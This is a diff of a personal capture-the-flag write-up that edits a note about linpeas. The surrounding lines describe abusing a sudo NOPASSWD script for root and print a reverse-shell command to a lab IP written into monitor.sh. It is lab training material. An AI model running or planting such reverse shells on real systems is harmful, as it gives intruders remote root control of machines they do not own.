@@ -46,7 +46,7 @@ from there we unzip personal.zip, we go ahead and unzip it and get monitor.sh
 taking a side look, we run `sudo -l` and we see that `(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh`
 
 maybe there is a password somewhere else??
-tried to download and run linpeas but no permission for that
+tried to download and run linpeas but no permission for that (looking back I prob forgot to chmod +x)
 
 NOTE: Always look at the NOPASSWD when sudo -l
 `echo "/bin/sh -i >& /dev/tcp/10.10.14.125/6000 0>&1" > monitor.sh`
